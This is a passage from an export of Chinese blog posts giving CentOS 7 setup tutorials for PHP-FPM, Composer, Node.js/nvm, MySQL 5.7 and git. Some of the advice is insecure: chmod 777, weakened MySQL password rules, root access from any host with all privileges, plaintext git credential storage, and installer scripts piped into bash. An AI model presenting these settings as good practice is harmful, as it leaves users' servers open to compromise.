cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\n\t\t\t<p>32</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>Installing shared extensions:     /usr/local/php/lib/php/extensions/no-debug-non-zts-20180731/</code></p>\n\n\t\t\t<p><code>Installing PHP CLI binary:        /usr/local/php/bin/</code></p>\n\n\t\t\t<p><code>Installing PHP CLI man page:      /usr/local/php/php/man/man1/</code></p>\n\n\t\t\t<p><code>Installing PHP FPM binary:        /usr/local/php/sbin/</code></p>\n\n\t\t\t<p><code>Installing PHP FPM defconfig:     /usr/local/php/etc/</code></p>\n\n\t\t\t<p><code>Installing PHP FPM man page:      /usr/local/php/php/man/man8/</code></p>\n\n\t\t\t<p><code>Installing PHP FPM status page:   /usr/local/php/php/php/fpm/</code></p>\n\n\t\t\t<p><code>Installing phpdbg binary:         /usr/local/php/bin/</code></p>\n\n\t\t\t<p><code>Installing phpdbg man page:       /usr/local/php/php/man/man1/</code></p>\n\n\t\t\t<p><code>Installing PHP CGI binary:        /usr/local/php/bin/</code></p>\n\n\t\t\t<p><code>Installing PHP CGI man page:      /usr/local/php/php/man/man1/</code></p>\n\n\t\t\t<p><code>Installing build environment:     /usr/local/php/lib/php/build/</code></p>\n\n\t\t\t<p><code>Installing header files:          /usr/local/php/</code><code>include</code><code>/php/</code></p>\n\n\t\t\t<p><code>Installing helper programs:       /usr/local/php/bin/</code></p>\n\n\t\t\t<p><code>  </code><code>program: phpize</code></p>\n\n\t\t\t<p><code>  </code><code>program: php-config</code></p>\n\n\t\t\t<p><code>Installing man pages:             /usr/local/php/php/man/man1/</code></p>\n\n\t\t\t<p><code>  </code><code>page: phpize.1</code></p>\n\n\t\t\t<p><code>  </code><code>page: php-config.1</code></p>\n\n\t\t\t<p><code>Installing PEAR environment:      /usr/local/php/lib/php/</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Warning: </code><code>\"continue\"</code> <code>targeting </code><code>switch</code> <code>is equivalent to </code><code>\"break\"</code><code>. Did you mean to </code><code>use</code> <code>\"continue 2\"</code><code>? in phar:</code><code>///home/flame/software/php-7.3.0/pear/install-pear-nozlib.phar/PEAR/PackageFile/v2/Validator.php on line 1933</code></p>\n\n\t\t\t<p><code>[PEAR] Archive_Tar    - installed: 1.4.3</code></p>\n\n\t\t\t<p><code>[PEAR] Console_Getopt - installed: 1.4.1</code></p>\n\n\t\t\t<p><code>[PEAR] Structures_Graph- installed: 1.1.1</code></p>\n\n\t\t\t<p><code>[PEAR] XML_Util       - installed: 1.4.2</code></p>\n\n\t\t\t<p><code>[PEAR] PEAR           - installed: 1.10.5</code></p>\n\n\t\t\t<p><code>Wrote PEAR system config file at: /usr/local/php/etc/pear.conf</code></p>\n\n\t\t\t<p><code>You may want to add: /usr/local/php/lib/php to your php.ini include_path</code></p>\n\n\t\t\t<p><code>/home/flame/software/php-7.3.0/build/shtool install -c ext/phar/phar.phar /usr/local/php/bin</code></p>\n\n\t\t\t<p><code>ln -s -f phar.phar /usr/local/php/bin/phar</code></p>\n\n\t\t\t<p><code>Installing PDO headers:           /usr/local/php/</code><code>include</code><code>/php/ext/pdo/</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><h3>配置，建立目录</h3>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>cp php.ini-production /usr/local/php/lib/php.ini</code></p>\n\n\t\t\t<p><code>cp /usr/local/php/etc/php-fpm.conf.</code><code>default</code> <code>/usr/local/php/etc/php-fpm.conf</code></p>\n\n\t\t\t<p><code>ln -s /usr/local/php/sbin/php-fpm /usr/local/bin</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>cd /usr/local/php/etc/php-fpm.d</code></p>\n\n\t\t\t<p><code>vim www.conf</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>输入</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>[www]</code></p>\n\n\t\t\t<p><code>listen = 127.0.0.1:9080   </code></p>\n\n\t\t\t<p><code>listen.mode = 0666      </code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>user = www  #php代码目录权限 需要跟这个一致，</code></p>\n\n\t\t\t<p><code>group = www #php代码目录权限 需要跟这个一致</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>pm = dynamic</code></p>\n\n\t\t\t<p><code>pm.max_children = 128</code></p>\n\n\t\t\t<p><code>pm.start_servers = 20</code></p>\n\n\t\t\t<p><code>pm.min_spare_servers = 5</code></p>\n\n\t\t\t<p><code>pm.max_spare_servers = 35</code></p>\n\n\t\t\t<p><code>pm.max_requests = 10000</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>rlimit_files = 1024</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>slowlog = log/</code><code>$pool</code><code>.log.slow</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><h3>加入 systemtl 服务</h3>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>cd /home/flame/software/php-7.3.0/sapi/fpm</code></p>\n\n\t\t\t<p><code>cp php-fpm.service /usr/lib/systemd/system/</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><h3>启动</h3>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>systemctl start php-fpm</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\n\t\t\t<p>32</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>#查看状态</code></p>\n\n\t\t\t<p><code>systemctl status php-fpm</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>#得到输出</code></p>\n\n\t\t\t<p><code>● php-fpm.service - The PHP FastCGI Process Manager</code></p>\n\n\t\t\t<p><code>   </code><code>Loaded: loaded (/usr/lib/systemd/system/php-fpm.service; disabled; vendor preset: disabled)</code></p>\n\n\t\t\t<p><code>   </code><code>Active: active (running) since Thu 2018-12-27 16:13:16 CST; 2s ago</code></p>\n\n\t\t\t<p><code> </code><code>Main PID: 16835 (php-fpm)</code></p>\n\n\t\t\t<p><code>   </code><code>CGroup: /system.slice/php-fpm.service</code></p>\n\n\t\t\t<p><code>           </code><code>├─16835 php-fpm: master process (/usr/local/php/etc/php-fpm.conf)</code></p>\n\n\t\t\t<p><code>           </code><code>├─16836 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16837 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16838 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16839 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16840 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16841 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16842 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16843 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16844 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16845 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16846 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16847 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16848 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16849 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16850 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16851 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16852 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16853 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>├─16854 php-fpm: pool www</code></p>\n\n\t\t\t<p><code>           </code><code>└─16855 php-fpm: pool www</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Dec 27 16:13:16 iZj6cas4fyg41lxhngh1z0Z systemd[1]: Started The PHP FastCGI Process Manager.</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><h3>测试</h3>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>mkdir</code> <code>-p /home/www/webroot/php</code></p>\n\n\t\t\t<p><code>cd /home/www/webroot/php</code></p>\n\n\t\t\t<p><code>vim test.php</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>输入</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>phpinfo();</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>?&gt;</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>访问<br>\nxxx.xxx.xxx.xxx:8080/test.php</p>\n\n<h3>php 命令环境</h3>\n\n<p>在$HOME/.profile里新增内容为</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>export PATH=</code><code>$PATH</code><code>:/usr/local/php/bin</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table>                                    </div>", "log_PostTime": 1584891248, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "安装PHP7.3.2make编译出现报错,内存不足导致,临时解决方法", "log_Intro": "安装PHP7.3.2make编译出现报错,内存不足导致,临时解决方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>错误现象：</strong></p>\n\n<pre>\ncc: Internal error: Killed (program cc1)\n...</pre>\n\n<p>大体上是因为内存不足,临时使用交换分区来解决吧</p>\n\n<pre class=\"has\">\n<code>sudo dd if=/dev/zero of=/swapfile bs=64M count=16\nsudo mkswap /swapfile\nsudo swapon /swapfile</code></pre>\n\n<p>编译完成，可以取消交换分区：</p>\n\n<pre class=\"has\">\n<code>sudo swapoff /swapfile\nsudo rm /swapfile</code></pre>\n\n<p>参考：<a href=\"https://gcc.gnu.org/bugzilla/show_bug.cgi?id=48796\" rel=\"nofollow\">https://gcc.gnu.org/bugzilla/show_bug.cgi?id=48796</a></p>\n                                    </div>", "log_PostTime": 1584891249, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7安装Composer", "log_Intro": "CentOS7安装Composer", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>1、使用命令下载</h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>curl -sS https://getcomposer.org/installer | php\n</code></pre>\n\n<h3>2、下载之后设置环境变量</h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>mv composer.phar /usr/local/bin/composer\n</code></pre>\n\n<h3>3、修改权限，否则执行会出错</h3>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>chmod -R 777 /usr/local/bin/composer</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891250, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7的node.js安装", "log_Intro": "CentOS7的node.js安装", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3 id=\"有3种方式可以安装nodejs\">一、方式1：yum安装</h3>\n\n<p>这里我们指定安装8.x以上的版本</p>\n\n<pre class=\"has\">\n<code>curl --silent --location https://rpm.nodesource.com/setup_8.x | sudo bash -\nyum install -y nodejs</code></pre>\n\n<p>一般在安装完node之后，默认已经帮我们安装好npm了 ，使用npm -v可以查看npm版本<br>\n通常如果使用npm install安装依赖包会比较慢，这里推荐使用淘宝镜像</p>\n\n<p>安装淘宝镜像cnpm</p>\n\n<pre class=\"has\">\n<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre>\n\n<p>之后在安装依赖的使用可以使用cnpm install代替npm install</p>\n\n<h3 id=\"二方式2源码安装\">二、方式2：源码安装</h3>\n\n<p>另外除了通过以上方式安装之后，还可以使用nvm和源码包的方式安装，以下是源码包的方式</p>\n\n<ol><li>下载</li>\n</ol><pre class=\"has\">\n<code>wget 'https://nodejs.org/dist/v6.11.3/node-v6.11.3-linux-x64.tar.xz'</code></pre>\n\n<p>（wget命令用来从指定的URL下载文件 查看命令http://man.linuxde.net/wget）</p>\n\n<ol><li>解压</li>\n</ol><pre class=\"has\">\n<code>xz -d  node-v6.11.3-linux-x64.tar.xz\ntar xvf node-v6.11.3-linux-x64.tar</code></pre>\n\n<p>（linux下tar.xz和tar.gz区别，同一文件，tar.xz格式比tar.gz格式小了三分之一，linux中tar怎么解压tar.xz文件<br>\n使用xz -d xxx.tar.xz 将 xxx.tar.xz解压成 xxx.tar<br>\n再用tar -xvf xxx.tar解压）</p>\n\n<ol><li>添加node的环境变量，在最后一行加入PATH</li>\n</ol><pre class=\"has\">\n<code>vi /etc/profile\n\n#最后一行加入PATH\n\nexport PATH=$PATH:/home/www/node-v6.11.3-linux-x64/bin</code></pre>\n\n<ol><li>使/etc/profile里的配置立即生效</li>\n</ol><pre class=\"has\">\n<code>source /etc/profile</code></pre>\n\n<h3 id=\"三方式3nvm安装\">三、方式3：nvm安装</h3>\n\n<p>nvm用于管理node版本,可以很方便的切换node的版本</p>\n\n<ol><li>安装nvm https://github.com/creationix/nvm<br>\n\t使用如下命令</li>\n</ol><pre class=\"has\">\n<code>curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</code></pre>\n\n<p>nvm命令无法使用，缺少.bash_profile文件</p>\n\n<pre class=\"has\">\n<code>MacBook-Pro:~ wuj$ nvm\n-bash: nvm: command not found</code></pre>\n\n<p>进入nvm目录，新建.bash_profile文件</p>\n\n<pre class=\"has\">\n<code>cd ~/.nvm\ntouch .bash_profile</code></pre>\n\n<p>并拷贝以下内容</p>\n\n<pre class=\"has\">\n<code>export NVM_DIR=\"$HOME/.nvm\"\n\n[ -s \"$NVM_DIR/nvm.sh\" ] &amp;&amp; \\. \"$NVM_DIR/nvm.sh\"  # This loads nvm</code></pre>\n\n<p>文件生效</p>\n\n<pre class=\"has\">\n<code>source ~/.nvm/.bash_profile</code></pre>\n\n<p>这时候可以使用了 ，查看nvm版本</p>\n\n<pre class=\"has\">\n<code>nvm --version\nnode version manger</code></pre>\n\n<p>安装指定node版本</p>\n\n<pre class=\"has\">\n<code>nvm install 8.9.4</code></pre>\n\n<h3 id=\"nvm常用命令\">nvm常用命令</h3>\n\n<pre class=\"has\">\n<code>nvm ls ：打印出所有的版本\nnvm install stable：安装最稳定的版本\nnvm install v8.9.2 ： 安装node的8.9.2的版本（删除用uninstall）\nnvm current ：当前使用的node版本\nnvm use v8.9.2 ：将node改为8.9.2版本\nnvm alias default 0.12.7：设置默认 node 版本为 0.12.7\nnvm alias default ：设置系统默认的node版本\nnvm alias  ：给不同的版本号添加别名\nnvm unalias  ： 删除已定义的别名\nnvm reinstall-packages ：在当前版本node环境下，重新全局安装指定版本号的npm包\nnpm install -g mz-fis：安装 mz-fis 模块至全局目录，安装的路径：/Users/&lt;你的用户名</code></pre>\n\n<h3 id=\"四git安装\">四、git安装</h3>\n\n<p>1、安装</p>\n\n<pre class=\"has\">\n<code>#安装git \nyum install git\n\n#卸载git\nyum remove git</code></pre>\n\n<p>2、查看是否安装成功</p>\n\n<pre class=\"has\">\n<code>git --version</code></pre>\n\n<p>3、我们就可以使用git clone 克隆项目</p>\n\n<pre class=\"has\">\n<code>git clone https://xxx@xxx.org/xxx/xxx.git</code></pre>\n                                    </div>", "log_PostTime": 1584891251, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7下安装nvm", "log_Intro": "CentOS7下安装nvm", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>1安装版本管理工具git</h2>\n\n<pre class=\"has\">\n<code>yum install git</code></pre>\n\n<p>查看git版本</p>\n\n<pre class=\"has\">\n<code>git --version</code></pre>\n\n<h2>2 安装Node.js版本管理工具nvm</h2>\n\n<pre class=\"has\">\n<code>curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</code></pre>\n\n<p>或者</p>\n\n<pre class=\"has\">\n<code>wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</code></pre>\n\n<p>还可以用下面这种方法</p>\n\n<pre class=\"has\">\n<code>git clone git://github.com/creationix/nvm.git ~/nvm</code></pre>\n\n<p>验证安装</p>\n\n<pre class=\"has\">\n<code>command -v nvm</code></pre>\n\n<p>设置nvm自动运行</p>\n\n<pre class=\"has\">\n<code>echo \"source ~/nvm/nvm.sh\" &gt;&gt; ~/.bashrc\nsource ~/.bashrc</code></pre>\n\n<p>查询Node.js版本</p>\n\n<pre class=\"has\">\n<code>nvm list-remote</code></pre>\n\n<p>安装Node.js版本</p>\n\n<pre class=\"has\">\n<code>nvm install v8.6.0\n</code></pre>\n\n<p>切换Node.js版本</p>\n\n<pre class=\"has\">\n<code>nvm use v8.6.0\n</code></pre>\n\n<p>升级npm</p>\n\n<pre class=\"has\">\n<code>npm -g</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891252, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7系统下bower 命令权限问题", "log_Intro": "CentOS7系统下bower 命令权限问题", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3><strong>执行bower命令后出现以下错误提示：</strong></h3>\n\n<p>bower ESUDO         Cannot be run with sudo</p>\n\n<p><br>\nAdditional error details:<br>\nSince bower is a user command, there is no need to execute it with superuser permissions.<br>\nIf you're having permission errors when using bower without sudo, please spend a few minutes learning more about how your system should work and make any necessary repairs.</p>\n\n<p>http://www.joyent.com/blog/installing-node-and-npm<br>\nhttps://gist.github.com/isaacs/579814</p>\n\n<p>You can however run a command with sudo using --allow-root option</p>\n\n<h3><strong>解决方法有两种：</strong></h3>\n\n<p>   1，根据错误提示在bower命令后面加--allow-root ，例如 bower install --allow-root</p>\n\n<p>   2，增加一个配置文件使得运行bower时候为root权限，~/.bowerrc</p>\n\n<p>内容如下</p>\n\n<pre class=\"has\">\n<code>{\"allow_root\": true }</code></pre>\n\n<p><br>\n </p>\n                                    </div>", "log_PostTime": 1584891253, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "解决每次git pull需要不用输入用户名信息", "log_Intro": "解决每次git pull需要不用输入用户名信息", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>问题描述</p>\n\n<p>在服务器上每次执行git pull，都提示输入用户名和密码</p>\n\n<p>现象分析</p>\n\n<p>我们在git clone工程时有2中形式 <code>https</code> 和<code>git@git</code>。当你使用前者拉取工程时每次都需要输入用户名和密码</p>\n\n<p>解决方案</p>\n\n<p><strong>1.执行下面命令</strong></p>\n\n<pre class=\"has\">\n<code>git config --global credential.helper store\n</code></pre>\n\n<blockquote>\n<p>这个时候~/.gitconfig文件中会多一行</p>\n\n<p>[credential]<br>\nhelper = store</p>\n</blockquote>\n\n<p><strong>2.执行git pull再次输入用户名和密码</strong></p>\n\n<p>此时你会看到<code>/root/.git-credentials</code>中会多一行内容。里面的内容类似<code>https://{username}:{password}@github.com</code>这种形式</p>\n                                    </div>", "log_PostTime": 1584891255, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "FastAdmin扩展PHPEXCEL，PHP7.3高版本兼容问题", "log_Intro": "FastAdmin扩展PHPEXCEL，PHP7.3高版本兼容问题", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3><strong>THINKPHP扩展PHPEXCEL与PHP7.3高版本兼容问题</strong></h3>\n\n<p>框架：THINKPHP5，PHPEXCEL版本：1.81</p>\n\n<p>无法导出EXCEL原因为Shared/OLE.php第290行使用continue，PHP7不支持，修改为continue 2即可。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191214231354288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191214231415390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n                                    </div>", "log_PostTime": 1584891256, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "centos7 安装 Mysql 5.7.28，详细完整教程", "log_Intro": "centos7 安装 Mysql 5.7.28，详细完整教程", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>1. 下载 MySQL yum包</h3>\n\n<pre class=\"has\">\n<code>wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm</code></pre>\n\n<h3><br>\n2.安装MySQL源</h3>\n\n<pre class=\"has\">\n<code>rpm -Uvh mysql57-community-release-el7-10.noarch.rpm</code></pre>\n\n<p> </p>\n\n<h3>3.安装MySQL服务端,需要等待一些时间</h3>\n\n<pre class=\"has\">\n<code>yum install -y mysql-community-server</code></pre>\n\n<p> </p>\n\n<h3>4.启动MySQL</h3>\n\n<pre class=\"has\">\n<code>systemctl start mysqld.service</code></pre>\n\n<p> </p>\n\n<h3>5.检查是否启动成功</h3>\n\n<pre>\n<code class=\"language-html\">systemctl status mysqld.service</code></pre>\n\n<p> </p>\n\n<h3>6.获取临时密码，MySQL5.7为root用户随机生成了一个密码</h3>\n\n<pre class=\"has\">\n<code>grep 'temporary password' /var/log/mysqld.log </code></pre>\n\n<p><img alt=\"\" class=\"has\" height=\"42\" src=\"https://img-blog.csdnimg.cn/20191215234444404.png\" width=\"760\"></p>\n\n<p> </p>\n\n<h3>7.通过临时密码登录MySQL，进行修改密码操作</h3>\n\n<pre class=\"has\">\n<code>mysql -uroot -p</code></pre>\n\n<p>使用临时密码登录后，不能进行其他的操作，否则会报错，这时候我们进行修改密码操作</p>\n\n<p> </p>\n\n<h3>8.因为MySQL的密码规则需要很复杂，我们一般自己设置的不会设置成这样，所以我们全局修改一下</h3>\n\n<pre class=\"has\">\n<code>mysql&gt; set global validate_password_policy=0;\nmysql&gt; set global validate_password_length=1;</code></pre>\n\n<p>这时候我们就可以自己设置想要的密码了</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>ALTER USER 'root'@'localhost' IDENTIFIED BY 'yourpassword';</code></pre>\n\n<p> </p>\n\n<h3>9.授权其他机器远程登录</h3>\n\n<pre class=\"has\">\n<code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'yourpassword' WITH GRANT OPTION;\n \nFLUSH PRIVILEGES;</code></pre>\n\n<p> </p>\n\n<h3>10.开启开机自启动</h3>\n\n<p>先退出mysql命令行，然后输入以下命令</p>\n\n<pre class=\"has\">\n<code>systemctl enable mysqld\nsystemctl daemon-reload</code></pre>\n\n<p> </p>\n\n<h3>11.设置MySQL的字符集为UTF-8，令其支持中文</h3>\n\n<pre class=\"has\">\n<code>vim /etc/my.cnf</code></pre>\n\n<p>改成如下,然后保存</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code># For advice on how to change settings please see\n# http://dev.mysql.com/doc/refman/5.7/en/server-configuration-defaults.html\n \n[mysql]\ndefault-character-set=utf8\n \n[mysqld]\ndatadir=/var/lib/mysql\nsocket=/var/lib/mysql/mysql.sock\ndefault-storage-engine=INNODB\ncharacter_set_server=utf8\n \nsymbolic-links=0\n \nlog-error=/var/log/mysqld.log\npid-file=/var/run/mysqld/mysqld.pid</code></pre>\n\n<p> </p>\n\n<h3>12.重启一下MySQL,令配置生效</h3>\n\n<pre class=\"has\">\n<code>service mysqld restart</code></pre>\n\n<p> </p>\n\n<h3>13.防火墙开放3306端口</h3>\n\n<pre class=\"has\">\n<code>firewall-cmd --state\nfirewall-cmd --zone=public --add-port=3306/tcp --permanent\nfirewall-cmd --reload</code></pre>\n\n<p> </p>\n\n<h3>14.卸载MySQL仓库</h3>\n\n<p>一开始的时候我们安装的yum，每次yum操作都会更新一次，耗费时间，我们把他卸载掉</p>\n\n<pre class=\"has\">\n<code>rpm -qa | grep mysql</code></pre>\n\n<p><img alt=\"\" class=\"has\" height=\"92\" src=\"https://img-blog.csdnimg.cn/20191215234458770.png\" width=\"321\"></p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>yum -y remove mysql57-community-release-el7-10.noarch</code></pre>\n\n<p> </p>\n\n<h3>15.数据库的操作</h3>\n\n<p> </p>\n\n<p>（1）查看mysql是否启动：service mysqld status</p>\n\n<p>启动mysql：service mysqld start</p>\n\n<p>停止mysql：service mysqld stop</p>\n\n<p>重启mysql：service mysqld restart</p>\n\n<p>（2）查看临时密码：grep password /var/log/mysqld.log</p>\n                                    </div>", "log_PostTime": 1584891257, "log_Meta": ""}
